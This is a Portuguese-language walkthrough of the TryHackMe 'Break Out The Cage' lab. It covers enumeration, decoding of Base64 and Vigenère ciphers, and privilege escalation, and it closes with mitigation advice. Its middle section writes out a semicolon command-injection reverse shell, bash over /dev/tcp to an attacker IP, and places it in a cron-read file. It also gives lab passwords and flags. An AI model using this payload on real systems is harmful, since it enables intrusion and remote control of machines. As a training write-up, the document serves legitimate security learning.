<!-- ===================================== -->
<!--   Break Out The Cage — TryHackMe      -->
<!-- ===================================== -->

<p align="center">
  <img src="https://img.shields.io/badge/Status-Developed-success?style=for-the-badge">
  <img src="https://img.shields.io/badge/Topic-Linux%20Privilege%20Escalation-critical?style=for-the-badge">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Pentest-Offensive-red?style=flat-square">
  <img src="https://img.shields.io/badge/Linux-OS-black?style=flat-square&logo=linux&logoColor=white">
  <img src="https://img.shields.io/badge/Web-Enumeration-blue?style=flat-square">
  <img src="https://img.shields.io/badge/Cryptography-Analysis-purple?style=flat-square">
  <img src="https://img.shields.io/badge/Post--Exploitation-Advanced-critical?style=flat-square">
</p>

---

# 🧪 Break Out The Cage — TryHackMe

> Writeup técnico e totalmente documentado do laboratório **Break Out The Cage** da plataforma TryHackMe, com foco em **enumeração de serviços**, **criptoanálise**, **esteganografia**, **exploração de scripts inseguros** e **escalonamento de privilégios em sistemas Linux**, seguindo metodologia prática de **pentest em ambiente controlado**.

---

### 📌 Metadados

- **Data:** 2026-01-23  
- **Status:** `#developed`  
- **Categoria:** Pentest · Linux Privilege Escalation  
- **Plataforma:** TryHackMe  
- **Ambiente:** Linux (Ubuntu 18.04)  

---

### 🏷️ Tags

`#TryHackMe` `#LinuxPrivilegeEscalation` `#Pentest` `#PostExploitation`  
`#Cryptography` `#Steganography` `#Enumeration` `#LinuxSecurity`  
`#RedTeam` `#CTF` `#CyberSecurity`

---

---
# Introdução

O laboratório ["Break Out The Cage"](https://tryhackme.com/room/breakoutthecage1) da TryHackMe é um exercício prático e envolvente de segurança ofensiva que simula um cenário realista de penetração em sistemas Linux. Ambientado no universo cinematográfico de Nicholas Cage, este desafio técnico apresenta múltiplas camadas de segurança que demonstram como vulnerabilidades aparentemente isoladas podem ser encadeadas para comprometer completamente um sistema.

## Objetivos Principais:

Este laboratório foi projetado para desenvolver habilidades práticas em:

- **Análise forense digital**: Exame de arquivos e mídias para extração de dados ocultos
- **Criptoanálise aplicada**: Quebra de cifras clássicas e modernas em contextos reais
- **Exploração de serviços**: Identificação e aproveitamento de configurações inseguras
- **Escalação de privilégios**: Técnicas avançadas para elevação de acesso em sistemas Linux

## Habilidades Desenvolvidas

A estrutura do laboratório segue uma progressão lógica que reflete metodologias de teste de penetração profissionais:

1. **Reconhecimento passivo e ativo**: Identificação de serviços e coleta de informações
2. **Análise de vulnerabilidades**: Avaliação de pontos fracos em configurações e códigos
3. **Exploração controlada**: Aplicação de técnicas específicas para cada vulnerabilidade
4. **Pós-exploração**: Manutenção de acesso e movimento lateral no sistema

---
# Mapeamento da Rede

## Comando de Varredura

```bash
nmap -sC -sV -oN open_ports.txt 10.81.137.168
```

**Explicação das Flags:**

- `-sC`: Executa scripts padrão do Nmap (default scripts)
- `-sV`: Detecta versão dos serviços (version detection)
- `-oN open_ports.txt`: Salva a saída em formato normal no arquivo `open_ports.txt`
- `10.81.137.168`: Endereço IP do alvo

## Resultado da Varredura

```text
Nmap scan report for 10.81.137.168
Host is up (0.25s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             396 May 25  2020 dad_tasks
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.150.236
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dd:fd:88:94:f8:c8:d1:1b:51:e3:7d:f8:1d:dd:82:3e (RSA)
|   256 3e:ba:38:63:2b:8d:1c:68:13:d5:05:ba:7a:ae:d9:3b (ECDSA)
|_  256 c0:a6:a3:64:44:1e:cf:47:5f:85:f6:1f:78:4c:59:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Nicholas Cage Stories
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## Análise dos Resultados

**Portas Abertas e Serviços:**

1. **Porta 21 (FTP)**:
    - Servidor: vsftpd 3.0.3
    - **Vulnerabilidade crítica**: `Anonymous FTP login allowed`
    - Arquivo disponível: `dad_tasks`

2. **Porta 22 (SSH)**:    
    - Servidor: OpenSSH 7.6p1 Ubuntu
    - Versão estável, mas versões antigas podem ter exploits

3. **Porta 80 (HTTP)**:    
    - Servidor: Apache 2.4.29
    - Título da página: "Nicholas Cage Stories"
    - Potencial para vulnerabilidades web

**Ponto Crítico Identificado:**

```text
ftp-anon: Anonymous FTP login allowed (FTP code 230)
```

**Significado:** O servidor FTP permite login anônimo, o que significa que qualquer usuário pode acessar o FTP sem credenciais. Esta é uma configuração insegura que frequentemente leva à exposição de dados sensíveis.

---
# Exploração da Porta FTP

## Conexão ao Servidor FTP

```bash
ftp 10.81.137.168
```

**Processo de Conexão:**

1. Será solicitado um nome de usuário → Digitar `anonymous`
2. Será solicitada uma senha → Pressionar Enter (senha em branco)
3. Código de resposta `230` indica login bem-sucedido

## Enumeração de Arquivos

Ao usar o comando `ls -al` para listar todos os arquivos (inclusive os ocultos) é possível visualizar as arquivos presentes no servidor FTP.

```bash
ftp> ls -al
229 Entering Extended Passive Mode (|||17261|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 May 25  2020 .
drwxr-xr-x    2 0        0            4096 May 25  2020 ..
-rw-r--r--    1 0        0             396 May 25  2020 dad_tasks
226 Directory send OK.
```

**Análise do Output:**

- `.` e `..`: Diretório atual e diretório pai
- `dad_tasks`: Arquivo de 396 bytes, permissões 644 (leitura para todos)
- Proprietário: UID 0 (root), GID 0 (root)

## Download do Arquivo

No servidor FTP não é possível fazer a leitura do arquivo, então é necessário transferir o arquivo para a nossa máquina de atacante da seguinte forma:

```bash
ftp> get dad_tasks
```

**Explicação:** O comando `get` transfere o arquivo do servidor FTP para a máquina local mantendo o mesmo nome.

## Análise do Conteúdo

Fora do servidor FTP é possível identificar o arquivo `dad_tasks` e ao utilizar o comando `cat`:

```bash
cat dad_tasks
```

**Conteúdo do Arquivo:**

```text
UWFwdyBFZWtjbCAtIFB2ciBSTUtQLi4uWFpXIFZXVVIuLi4gVFRJIFhFRi4uLiBMQUEgWlJHUVJPISEhIQpTZncuIEtham5tYiB4c2kgb3d1b3dnZQpGYXouIFRtbCBma2ZyIHFnc2VpayBhZyBvcWVpYngKRWxqd3guIFhpbCBicWkgYWlrbGJ5d3FlClJzZnYuIFp3ZWwgdnZtIGltZWwgc3VtZWJ0IGxxd2RzZmsKWWVqci4gVHFlbmwgVnN3IHN2bnQgInVycXNqZXRwd2JuIGVpbnlqYW11IiB3Zi4KCkl6IGdsd3cgQSB5a2Z0ZWYuLi4uIFFqaHN2Ym91dW9leGNtdndrd3dhdGZsbHh1Z2hoYmJjbXlkaXp3bGtic2lkaXVzY3ds
```

**Observação Inicial:** O padrão do texto (caracteres A-Z, a-z, 0-9, +, /, =) é característico de codificação **Base64**.

## Identificação da Cifra

Utilizando o [Cipher Identifier da Boxentriq](https://www.boxentriq.com/code-breaking/cipher-identifier):

![Resultado Base64](assets/Pasted%20image%2020260123093835.png)

**Resultado:** O algoritmo identifica com alta probabilidade (100%) que se trata de **Base64**.

## Decodificação Base64

```bash
base64 -d dad_tasks > base64_dadtasks
```

**Parâmetros do Comando:**

- `-d`: Modo decode (decodificar)
- `dad_tasks`: Arquivo de entrada
- `> base64_dadtasks`: Redireciona a saída para um novo arquivo

**Conteúdo Decodificado:**

```text
Qapw Eekcl - Pvr RMKP...XZW VWUR... TTI XEF... LAA ZRGQRO!!!!
Sfw. Kajnmb xsi owuowge
Faz. Tml fkfr qgseik ag oqeibx
Eljwx. Xil bqi aiklbywqe
Rsfv. Zwel vvm imel sumebt lqwdsfk
Yejr. Tqenl Vsw svnt "urqsjetpwbn einyjamu" wf.

Iz glww A ykftef.... Qjhsvbouuoexcmvwkwwatfllxughhbbcmydizwlkbsidiuscwl
```

**Análise:** O texto ainda parece cifrado, indicando camadas múltiplas de codificação.

## Identificação da Segunda Cifra

Utilizando novamente o Cipher Identifier:

![Resultado Vigenere Cipher](assets/Pasted%20image%2020260123094438.png)

**Resultado:** Identificado como **Vigenère Cipher** com 89% de probabilidade.

**Características da Cifra de Vigenère:**

- Cifra polialfabética (usa múltiplos alfabetos de substituição)
- Requer uma chave para decodificação
- Historicamente conhecida como "le chiffre indéchiffrable"

---
# Exploração da Página Web (Porta 80)

## Página Inicial

![Página Web](assets/Pasted%20image%2020260123094807.png)

**Observação:** A página inicial é estática e não contém links funcionais ou formulários interativos e o seu código fonte não contém nada que seja importante.

## Enumeração de Diretórios com Gobuster

```bash
gobuster dir -u 10.81.137.168 -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt 
```

**Parâmetros do Comando:**

- `dir`: Modo de enumeração de diretórios
- `-u 10.81.137.168`: URL alvo
- `-w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt`: Wordlist contendo possíveis nomes de diretórios

**Resultado:**

```text
images               (Status: 301) [Size: 315] [--> http://10.81.137.168/images/]
html                 (Status: 301) [Size: 313] [--> http://10.81.137.168/html/]
scripts              (Status: 301) [Size: 316] [--> http://10.81.137.168/scripts/]
contracts            (Status: 301) [Size: 318] [--> http://10.81.137.168/contracts/]
auditions            (Status: 301) [Size: 318] [--> http://10.81.137.168/auditions/]
```

**Análise dos Diretórios:**

- `images/`: Provavelmente contém imagens do site
- `html/`: Código HTML adicional
- `scripts/`: Scripts do lado do cliente/servidor
- `contracts/`: Possíveis documentos contratuais
- `auditions/`: Arquivos de audição (potencialmente interessantes)

## Investigação do Diretório Auditions

Após analisar os subdomínios foi possível identificar um arquivo de interesse no subdomínio `/auditions`, um arquivo de áudio nomeado `must_practice_corrupt_file.mp3`.

![Auditions](assets/Pasted%20image%2020260123095707.png)

É possível fazer download do arquivo através do seguinte comando:

```bash
wget http://10.81.137.168/auditions/must_practice_corrupt_file.mp3
```

## Análise Forense do Arquivo MP3

**Técnica:** Análise de espectrograma - método de esteganografia que esconde informações visuais em arquivos de áudio.

**Ferramenta:** [Sonic Visualiser](https://www.sonicvisualiser.org/download.html)

**Processo:**

1. Abrir o arquivo MP3 no Sonic Visualiser
2. Adicionar uma nova camada de espectrograma (tecla `G`)
3. Ajustar os parâmetros para melhor visualização

**Resultado da Análise:**

![Espectrograma](assets/Pasted%20image%2020260123101446.png)

**Texto Identificado:** `namelesstwo`

**Significado:** Este texto provavelmente serve como **chave** para a cifra de Vigenère identificada anteriormente.

## Decodificação da Cifra de Vigenère

**Ferramenta:** [Cryptii - Vigenère Cipher](https://cryptii.com/pipes/vigenere-cipher)

**Configuração:**

- Texto cifrado: Conteúdo do arquivo após decodificação Base64
- Chave: `namelesstwo`
- Modo: Decrypt

**Processo de Decodificação:**

![Descriptografando a Cifra](assets/Pasted%20image%2020260123102626.png)

**Texto Decodificado Final:**

```text
Dads Tasks - The RAGE...THE CAGE... THE MAN... THE LEGEND!!!!
One. Revamp the website
Two. Put more quotes in script
Three. Buy bee pesticide
Four. Help him with acting lessons
Five. Teach Dad what "information security" is.

In case I forget.... Mydadisghostrideraintthatcoolnocausehesonfirejokes
```

## Conclusão da Primeira Fase

**Flag Obtida:** `Mydadisghostrideraintthatcoolnocausehesonfirejokes`

**Análise da Flag:**

- Referência ao filme "Ghost Rider" estrelado por Nicholas Cage
- Formato típico de flags em CTFs (sem espaços, mistura de palavras)
- Será utilizada como credencial nas próximas etapas do laboratório

---
# Explorando SSH

## Conexão SSH com as Credenciais Descobertas

Após descobrir a flag `Mydadisghostrideraintthatcoolnocausehesonfirejokes`, identificamos que esta é a senha do usuário **Weston**. Podemos nos conectar via SSH utilizando:

```bash
ssh weston@10.81.137.168/
```

**Explicação do comando:**

- `ssh`: Protocolo Secure Shell para conexão remota segura
- `weston`: Nome do usuário no servidor remoto
- `@10.81.137.168`: Endereço IP do servidor alvo

**Processo de autenticação:**

1. Será solicitada a senha do usuário Weston
2. Inserir: `Mydadisghostrideraintthatcoolnocausehesonfirejokes`
3. Conexão bem-sucedida é estabelecida

**Saída da conexão:**

```text
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Jan 23 11:11:58 UTC 2026

  System load:  0.0                Processes:           94
  Usage of /:   20.3% of 19.56GB   Users logged in:     0
  Memory usage: 33%                IP address for ens5: 10.81.151.219
  Swap usage:   0%


39 packages can be updated.
0 updates are security updates.


         __________
        /\____;;___\
       | /         /
       `. ())oo() .
        |\(%()*^^()^\
       %| |-%-------|
      % \ | %  ))   |
      %  \|%________|
       %%%%
Last login: Tue May 26 10:58:20 2020 from 192.168.247.1
```

**Informações importantes obtidas:**

- Sistema: Ubuntu 18.04.4 LTS
- Kernel: 4.15.0-101-generic
- Hostname: `national-treasure` (revelado posteriormente)
- Último login: 2020 (sistema pouco utilizado)

## Enumeração de Usuários do Sistema

```bash
cat /etc/passwd | grep -E "(bash|sh)$"
```

**Explicação do comando:**

- `cat /etc/passwd`: Exibe o arquivo que contém informações dos usuários
- `|`: Pipe - envia a saída do primeiro comando como entrada do segundo
- `grep -E "(bash|sh)$"`: Filtra linhas que terminam com "bash" ou "sh"
    - `-E`: Usa expressões regulares estendidas
    - `(bash|sh)$`: Padrão que casa com "bash" ou "sh" no final da linha

**Resultado:**

```text
root:x:0:0:root:/root:/bin/bash
cage:x:1000:1000:cage:/home/cage:/bin/bash
weston:x:1001:1001::/home/weston:/bin/bash
```

**Análise dos usuários:**

1. **root** (UID 0): Superusuário com privilégios totais
2. **cage** (UID 1000): Usuário padrão, provavelmente o principal
3. **weston** (UID 1001): Nosso usuário atual

## Verificação de Privilégios Sudo

```bash
sudo -l
```

**Explicação do comando:**

- `sudo`: Executa comandos com privilégios elevados
- `-l`: Lista os comandos que o usuário atual pode executar com sudo
- Será solicitada a senha do usuário Weston

**Resultado:**

```text
Matching Defaults entries for weston on national-treasure:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User weston may run the following commands on national-treasure:
    (root) /usr/bin/bees
```

**Análise do output:**

1. **Defaults**: Configurações padrão do sudo
    - `env_reset`: Reseta variáveis de ambiente para segurança
    - `mail_badpass`: Envia email em tentativas de senha incorreta        
    - `secure_path`: PATH seguro definido (impede PATH hijacking)

2. **Privilégios específicos**:
    - Weston pode executar `/usr/bin/bees` como **root**        
    - Isso é um vetor potencial de escalação de privilégios

## Análise do Binário Bees

```bash
cd /usr/bin/
cat bees
```


**Explicação:**

- `cd /usr/bin/`: Navega para o diretório de binários do sistema
- `cat bees`: Exibe o conteúdo do arquivo `bees`

**Resultado:**

```text
#!/bin/bash

wall "AHHHHHHH THEEEEE BEEEEESSSS!!!!!!!!"
```

**Análise do script:**

1. **Shebang**: `#!/bin/bash` - Indica que é um script bash
2. **Comando `wall`**:
    - Envia mensagem para todos os usuários logados
    - Executa com privilégios de root quando chamado via sudo
3. **Conteúdo**: Apenas exibe uma mensagem, sem funcionalidade útil

**Ponto importante**: Embora o script atual seja inofensivo, como Weston pode executá-lo como root, ele pode ser **modificado ou explorado** de várias formas:

- Substituir o script por um payload malicioso
- Explorar possíveis vulnerabilidades no script
- Usar como ponto de entrada para outros ataques

---
# Enumerando com LinPeas

## Transferência do Script LinPEAS

### No Computador Atacante (Kali Linux)

Primeiro, localizamos e copiamos o scrpit LinPEAS:

```bash
cp /usr/share/peass/linpeas/linpeas.sh ~
```

**Explicação:**

- `/usr/share/peass/linpeas/linpeas.sh`: Localização padrão do LinPEAS em Kali Linux
- `~`: Diretório home do usuário atual

Em seguida, iniciamos um servidor web simples para transferência:

```bash
sudo python3 -m http.server 80
```

**Explicação:**

- `sudo`: Executa com privilégios de root (necessário para porta 80)
- `python3 -m http.server 80`: Inicia servidor HTTP na porta 80
    - `-m http.server`: Módulo Python para servidor HTTP simples
    - `80`: Porta padrão HTTP

### No Servidor Alvo (Como Weston)

Primeiro, navegamos para o diretório `/tmp`:

```bash
cd /tmp
```

**Por que `/tmp`?**

- Diretório temporário com permissões de escrita para todos os usuários
- Ideal para transferência de arquivos
- Arquivos podem ser executados
- O conteúdo é geralmente limpo após reinicialização

Em seguida, baixamos o script LinPEAS:
```bash
wget 'http://{IP_ATACANTE}:80/linpeas.sh'
```

**Explicação:**

- `wget`: Ferramenta para download via HTTP/HTTPS/FTP
- `{IP_ATACANTE}`: Substituir pelo IP da sua máquina atacante
- `linpeas.sh`: Nome do arquivo a ser baixado

Tornamos o script executável e o executamos:

```bash
chmod +x linpeas.sh
./linpeas.sh
```

**Explicação:**

- `chmod +x linpeas.sh`: Adiciona permissão de execução ao arquivo
- `./linpeas.sh`: Executa o script (`. /` indica diretório atual)

## Resultados Interessantes do LinPEAS

```text
╔══════════╣ Interesting GROUP writable files (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files

  Group cage:
/opt/.dads_scripts/.files
/opt/.dads_scripts/.files/.quotes
```

**Análise dos resultados:**

1. **Arquivos graváveis pelo grupo "cage"**:
    - Weston pertence ao grupo cage? (`id` para verificar)        
    - Se sim, pode modificar arquivos nestes diretórios

2. **Localização**: `/opt/.dads_scripts/`
    - `.dads_scripts` (começa com ponto) - diretório oculto        
    - `/opt/`: Diretório para software adicional/terceiros

3. **Significado**:
    - Acesso de escrita pode permitir manipulação de scripts
    - Potencial para escalação se scripts forem executados com privilégios elevados

## Enumeração com pspy

### O que é pspy?

**pspy** é uma ferramenta que monitora processos em tempo real sem necessitar de privilégios root. É útil para:

- Detectar tarefas agendadas (cron jobs)
- Identificar processos automáticos
- Descobrir scripts executados periodicamente

### Transferência do pspy

**No computador atacante:**

```bash
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
```

**No servidor alvo:**

```bash
cd /tmp
wget 'http://{IP_ATACANTE}:80/pspy64'
chmod +x pspy64
./pspy64
```

### Resultados Importantes do pspy

```text 
CMD: UID=1000  PID=27306  | python /opt/.dads_scripts/spread_the_quotes.py 
CMD: UID=1000  PID=27305  | /bin/sh -c /opt/.dads_scripts/spread_the_quotes.py 
```

(**Análise detalhada:**

1. **Processo identificado**: `spread_the_quotes.py`
    
    - Executado como UID 1000 (usuário `cage`)
    - Localizado em `/opt/.dads_scripts/`

2. **Execução periódica**:    
    - Provavelmente um cron job ou serviço agendado
    - Executa automaticamente em intervalos regulares

3. **Implicações de segurança**:    
    - Se Weston pode modificar `spread_the_quotes.py` (devido às permissões de grupo)
    - E o script é executado automaticamente como usuário `cage`
    - Então Weston pode executar código como `cage`

4. **Cadeia de exploração potencial**:

```text
Weston (escreve) → spread_the_quotes.py (modificado) → Executado como cage → Acesso como cage
```

---
# Análise e Exploração do Sistema

## Exploração do Diretório `/opt/.dads_scripts`

O próximo passo é investigar o diretório `/opt/.dads_scripts` para entender melhor o sistema e encontrar vetores de exploração.

## Localizando o Diretório Oculto

Ao navegar para `/opt`, inicialmente pode parecer que o diretório `.dads_scripts` não existe:

```bash
cd /opt
ls
```

Isso ocorre porque **diretórios com nomes começando com ponto (.) são ocultos** no Linux. Para visualizá-los:

```bash
ls -al
```

**Explicação do comando:**

- `-a`: Mostra todos os arquivos, incluindo ocultos    
- `-l`: Formato longo (lista detalhada)

**Resultado:**

```text
drwxr-xr-x  3 root root 4096 May 25  2020 .
drwxr-xr-x 24 root root 4096 May 26  2020 ..
drwxr-xr-x  3 cage cage 4096 May 26  2020 .dads_scripts
```

**Análise das permissões:**

- `drwxr-xr-x`: Diretório com permissões 755
    - Dono (cage): leitura, escrita, execução
    - Grupo (cage): leitura e execução
    - Outros: leitura e execução
- `cage cage`: Proprietário e grupo são ambos "cage"

## Investigando o Conteúdo

```bash
cd .dads_scripts
ls -al
```

**Resultado:**

```text
drwxrwxr-x 2 cage cage 4096 May 25  2020 .files
-rwxr--r-- 1 cage cage  255 May 26  2020 spread_the_quotes.py
```

**Análise:**

1. **`.files/`**: Diretório com permissões 775 (grupo tem escrita)
2. **`spread_the_quotes.py`**: Script Python com permissões 755

## Análise do Script Python

```bash
cat spread_the_quotes.py
```

**Código do script:**

```python
#!/usr/bin/env python

#Copyright Weston 2k20 (Dad couldnt write this with all the time in the world!)
import os
import random

lines = open("/opt/.dads_scripts/.files/.quotes").read().splitlines()
quote = random.choice(lines)
os.system("wall " + quote)
```

**Explicação linha por linha:**

1. `#!/usr/bin/env python`: Shebang - especifica que o interpretador Python deve executar o script
2. `import os`: Importa módulo para interagir com sistema operacional
3. `import random`: Importa módulo para gerar números aleatórios
4. `lines = open("/opt/.dads_scripts/.files/.quotes").read().splitlines()`:
    - Abre o arquivo `.quotes`
    - Lê seu conteúdo
    - Divide em linhas
    - Armazena na lista `lines`

5. `quote = random.choice(lines)`: Seleciona uma linha aleatória da lista    
6. `os.system("wall " + quote)`: Executa comando `wall` com a citação selecionada

**Vulnerabilidade identificada:** O script usa `os.system()` concatenando entrada de arquivo sem sanitização.

## Exploração da Vulnerabilidade

### Verificando Permissões

```bash
cd .files
ls -al
```

**Resultado:**

```text
-rwxrw---- 1 cage cage 4204 May 25  2020 .quotes
```

**Análise das permissões:**

- `-rwxrw----`: Permissões 760
    - Dono (cage): leitura, escrita, execução
    - Grupo (cage): leitura e escrita
    - Outros: nenhuma permissão

**Implicação:** Se Weston pertence ao grupo `cage`, pode modificar o arquivo `.quotes`.

## Modificando o Arquivo `.quotes`

```bash
vi .quotes
```

**Comandos no vi:**

1. `dG`: Apaga todo o conteúdo do arquivo
    
    - `d`: Comando delete
    - `G`: Vai para o final do arquivo
    - Juntos: deleta da posição atual até o final

## Injetando Payload Malicioso

Substituímos o conteúdo por:

```bash
; bash -c "bash -i >& /dev/tcp/{ip_atacante}/4444 0>&1"
```

**Análise do payload:**

1. `;`: Caractere de terminação de comando no shell
    - Permite executar múltiplos comandos em sequência
2. `bash -c "..."`: Executa comando bash
3. `bash -i >& /dev/tcp/{IP_ATACANTE}/4444 0>&1`:
    - `bash -i`: Shell interativo
    - `>&`: Redireciona stdout e stderr
    - `/dev/tcp/{IP_ATACANTE}/4444`: Conecta via TCP ao atacante
    - `0>&1`: Redireciona stdin para stdout (conecta entrada também)

**Resultado:** Quando o script Python executar `os.system("wall " + quote)`, ele tentará:

```text
wall ; bash -c "bash -i >& /dev/tcp/{IP_ATACANTE}/4444 0>&1"
```

O `;` faz o shell executar `wall` (sem argumentos) e depois nosso reverse shell.

## Configurar o Listener

No computador atacante:

```bash
nc -lvnp 4444
```

### Aguardando Execução

O script `spread_the_quotes.py` é executado periodicamente (provavelmente via cron job). Após alguns minutos, obtemos conexão como usuário `cage`.

## Como usuário Cage

### Enumeração do Home Directory

Como usuário `cage` podemos em seguida listar o conteúdo da sua home para procurar novos arquivos de interesse usando o comando `ls -al`.

**Resultado:**

```text
drwx------ 7 cage cage 4096 May 26  2020 .
drwxr-xr-x 4 root root 4096 May 26  2020 ..
lrwxrwxrwx 1 cage cage    9 May 26  2020 .bash_history -> /dev/null
-rw-r--r-- 1 cage cage  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 cage cage 3771 Apr  4  2018 .bashrc
drwx------ 2 cage cage 4096 May 25  2020 .cache
drwxrwxr-x 2 cage cage 4096 May 25  2020 email_backup
drwx------ 3 cage cage 4096 May 25  2020 .gnupg
drwxrwxr-x 3 cage cage 4096 May 25  2020 .local
-rw-r--r-- 1 cage cage  807 Apr  4  2018 .profile
-rw-rw-r-- 1 cage cage   66 May 25  2020 .selected_editor
drwx------ 2 cage cage 4096 May 26  2020 .ssh
-rw-r--r-- 1 cage cage    0 May 25  2020 .sudo_as_admin_successful
-rw-rw-r-- 1 cage cage  230 May 26  2020 Super_Duper_Checklist
-rw------- 1 cage cage 6761 May 26  2020 .viminfo

```

O arquivo de interesse para este laboratório é o arquivo `Super_Duper_Checklist`. Ao visualizar o conteúdo do arquivo com `cat`, conseguimos encontrar a segunda flag do laboratório.

```text
1 - Increase acting lesson budget by at least 30%
2 - Get Weston to stop wearing eye-liner
3 - Get a new pet octopus
4 - Try and keep current wife
5 - Figure out why Weston has this etched into his desk: THM{M37AL_0R_P3N_T35T1NG}
```

---
# Escalando para Root

## Investigando Email Backup

O próximo passo é escalar privilégio novamente, mas desta vez para root.

Ainda no usuário `cage` é possível notar o diretório `email_backup` e ao entrar neste diretório podemos listar  e visualizar os conteúdos dos emails.

```bash
cd email_backup
ls -al
```

**Resultado:**

```text
drwxrwxr-x 2 cage cage 4096 May 25  2020 .
drwx------ 7 cage cage 4096 May 26  2020 ..
-rw-rw-r-- 1 cage cage  431 May 25  2020 email_1
-rw-rw-r-- 1 cage cage  733 May 25  2020 email_2
-rw-rw-r-- 1 cage cage  745 May 25  2020 email_3
```

## Análise do `email_3`

Ao visualizar o conteúdo de todos emails foi possível localizar algo de interesse no arquivo `email_3`:

```text
From - Cage@nationaltreasure.com
To - Weston@nationaltreasure.com

Hey Son

Buddy, Sean left a note on his desk with some really strange writing on it. I quickly wrote
down what it said. Could you look into it please? I think it could be something to do with his
account on here. I want to know what he's hiding from me... I might need a new agent. Pretty
sure he's out to get me. The note said:

haiinspsyanileph

The guy also seems obsessed with my face lately. He came him wearing a mask of my face...
was rather odd. Imagine wearing his ugly face.... I wouldnt be able to FACE that!! 
hahahahahahahahahahahahahahahaahah get it Weston! FACE THAT!!!! hahahahahahahhaha
ahahahhahaha. Ahhh Face it... he's just odd. 

Regards

The Legend - Cage
```

**Análise:**

1. Texto cifrado: `haiinspsyanileph`
2. Dicas no texto: múltiplas referências a "FACE"
3. Provável cifra de Vigenère com chave relacionada a "face"

## Decifrando a Mensagem

Usando [Cryptii - Vigenère Cipher](https://cryptii.com/pipes/vigenere-cipher):

- Texto cifrado: `haiinspsyanileph`
- Chave: `face` (deduzida das dicas no email)    
- Modo: Decrypt

**Resultado:** `cageisnotalegend`

**Interpretação:** Esta é provavelmente a senha do usuário root ou de outro usuário privilegiado.

## Escalando Para Root

```bash
su root
Password: cageisnotalegend
```

## Buscando a Flag Final

Novamente ao listar todo o conteúdo com `ls -al` no home do usuário root é possível encontrar o diretório `email_backup` presente novamente.

Ao entrar no diretório e visualizando com `cat` os emails, é possível encontrar no `email_2` a chave final do laboratório.

```text
From - master@ActorsGuild.com
To - SeanArcher@BigManAgents.com

Dear Sean

I'm very pleased to here that Sean, you are a good disciple. Your power over him has become
strong... so strong that I feel the power to promote you from disciple to crony. I hope you
don't abuse your new found strength. To ascend yourself to this level please use this code:

THM{8R1NG_D0WN_7H3_C493_L0N9_L1V3_M3}

Thank you

Sean Archer
```

---
# Resumo das Técnicas Utilizadas

## 1. Reconhecimento e Enumeração

- **Nmap**: Varredura de portas e identificação de serviços
- **FTP Anônimo**: Acesso não autenticado e download de arquivos
- **Gobuster**: Enumeração de diretórios web

## 2. Criptoanálise e Esteganografia

- **Base64**: Identificação e decodificação de conteúdo
- **Vigenère Cipher**: Quebra de cifra usando chave descoberta
- **Espectrograma**: Análise de arquivo MP3 para dados ocultos

## 3. Exploração de Serviços

- **SSH**: Conexão com credenciais descobertas
- **FTP**: Transferência de arquivos
- **HTTP**: Enumeração de conteúdo web

## 4. Escalação de Privilégios

- **SUDO Privileges**: Análise de comandos permitidos via sudo
- **Cron Job Exploitation**: Manipulação de scripts executados periodicamente
- **PATH Manipulation**: Exploração de scripts que usam comandos sem path absoluto
- **Command Injection**: Injeção via ponto-e-vírgula em scripts Python

## 5. Análise Forense

- **LinPEAS**: Enumeração automatizada de vetores de escalação
- **pspy**: Monitoramento de processos em tempo real
- **Análise de Logs**: Investigação de arquivos de sistema e usuário

---
# Lições de Segurança Aprendidas

## 1. Configurações Inseguras

- **FTP Anônimo**: Nunca habilitar em ambientes de produção
- **Permissões de Grupo**: Configurações de grupo com escrita podem permitir escalação
- **SUDO sem Senha**: Comandos sudo sem necessidade de senha são perigosos

## 2. Vulnerabilidades de Código

- **os.system() sem Sanitização**: Concatenar entrada do usuário em comandos shell
- **Scripts Automatizados**: Tarefas agendadas que executam scripts modificáveis
- **Hardcoded Credentials**: Credenciais em textos cifrados mas decifráveis

## 3. Falhas Criptográficas

- **Base64 como "Criptografia"**: Base64 é codificação, não criptografia
- **Cifras Fracas**: Vigenère não é seguro para proteção de dados sensíveis
- **Chaves Previsíveis**: Chaves derivadas de contexto são vulneráveis

## 4. Falhas Operacionais

- **Diretórios Ocultos**: Não são medidas de segurança efetivas
- **Backups Inseguros**: Arquivos de backup com informações sensíveis
- **Comunicação Clara**: Dicas em comunicações podem revelar segredos

---
# Sugestões Mitigação

## 1. Fortalecimento de Serviços

```bash
# Desabilitar FTP anônimo no vsftpd
echo "anonymous_enable=NO" >> /etc/vsftpd.conf
systemctl restart vsftpd

# Configurar SSH com autenticação forte
echo "PasswordAuthentication no" >> /etc/ssh/sshd_config
echo "PermitRootLogin no" >> /etc/ssh/sshd_config
systemctl restart sshd
```

## 2. Controle de Permissões

```bash
# Revisar permissões de grupo regularmente
find / -type f -perm -g=w -ls 2>/dev/null | grep -v "/proc/"

# Remover permissões de escrita desnecessárias
chmod g-w /opt/.dads_scripts/.files/.quotes

# Implementar princípio do menor privilégio
chown root:root /opt/.dads_scripts/spread_the_quotes.py
